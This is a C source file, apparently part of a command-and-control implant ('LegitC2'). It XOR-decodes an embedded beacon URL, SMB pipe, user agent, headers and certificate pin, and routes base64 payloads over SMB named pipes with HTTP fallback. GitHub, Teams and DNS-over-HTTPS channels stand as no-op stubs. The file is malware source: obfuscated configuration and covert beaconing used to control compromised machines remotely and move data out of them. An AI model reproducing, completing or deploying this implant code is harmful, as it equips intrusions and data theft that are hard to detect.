#include "channels.h"
#include "agent_config.h"
#include <stdlib.h>
#include <string.h>

/* ---- No-op stubs ---- */

int   github_send(const channel_config_t *cfg, const char *id, const char *b64)
{ (void)cfg; (void)id; (void)b64; return CHANNEL_ERR; }
char *github_recv(const channel_config_t *cfg, const char *id)
{ (void)cfg; (void)id; return NULL; }

int   teams_send(const channel_config_t *cfg, const char *id, const char *b64)
{ (void)cfg; (void)id; (void)b64; return CHANNEL_ERR; }
char *teams_recv(const channel_config_t *cfg, const char *id)
{ (void)cfg; (void)id; return NULL; }

int   doh_send(const channel_config_t *cfg, const char *id, const char *b64)
{ (void)cfg; (void)id; (void)b64; return CHANNEL_ERR; }
char *doh_recv(const channel_config_t *cfg, const char *id)
{ (void)cfg; (void)id; return NULL; }

/* ---- XOR deobfuscation ---- */

static void cfg_decode(const unsigned char *src, size_t len, char *dst)
{
    for (size_t i = 0; i < len; i++)
        dst[i] = (char)(src[i] ^ CFG_XOR_KEY[i % CFG_XOR_KEY_LEN]);
    dst[len] = '\0';
}

/* ---- Config init — beacon_url only ---- */

void channel_config_init(channel_config_t *cfg)
{
    memset(cfg, 0, sizeof(*cfg));

    if (CFG_BEACON_URL_LEN)
        cfg_decode(CFG_BEACON_URL, CFG_BEACON_URL_LEN, cfg->beacon_url);
#if defined(CFG_SMB_HOST_LEN) && CFG_SMB_HOST_LEN > 0
    cfg_decode(CFG_SMB_HOST, CFG_SMB_HOST_LEN, cfg->smb_host);
#endif
#if defined(CFG_SMB_PIPE_LEN) && CFG_SMB_PIPE_LEN > 0
    cfg_decode(CFG_SMB_PIPE, CFG_SMB_PIPE_LEN, cfg->smb_pipe);
#endif

#ifndef NDEBUG
    /* Dev override: env var */
    const char *v = getenv("LEGITC2_BEACON_URL");
    if (v && *v)
        strncpy(cfg->beacon_url, v, sizeof(cfg->beacon_url) - 1);
#endif

#if defined(CFG_HTTP_USERAGENT_LEN) && CFG_HTTP_USERAGENT_LEN > 0
    cfg_decode(CFG_HTTP_USERAGENT, CFG_HTTP_USERAGENT_LEN, cfg->http_useragent);
#endif
#if defined(CFG_HTTP_EXTRA_HEADERS_LEN) && CFG_HTTP_EXTRA_HEADERS_LEN > 0
    cfg_decode(CFG_HTTP_EXTRA_HEADERS, CFG_HTTP_EXTRA_HEADERS_LEN, cfg->http_extra_headers);
#endif
#if defined(CFG_CERT_PIN_LEN) && CFG_CERT_PIN_LEN == 64
    cfg_decode(CFG_CERT_PIN, CFG_CERT_PIN_LEN, cfg->http_cert_pin);
#endif
}

/* ---- Dispatcher ---- */

int channel_send(const channel_config_t *cfg, const char *id, const char *b64)
{
    if (cfg->smb_host[0] && smb_send(cfg, id, b64) == CHANNEL_OK) return CHANNEL_OK;
    return http_send(cfg, id, b64);
}

char *channel_recv(const channel_config_t *cfg, const char *id)
{
    (void)id;
    if (cfg->smb_host[0]) {
        char *r = smb_recv();
        if (r) return r;
    }
    return http_recv();
}
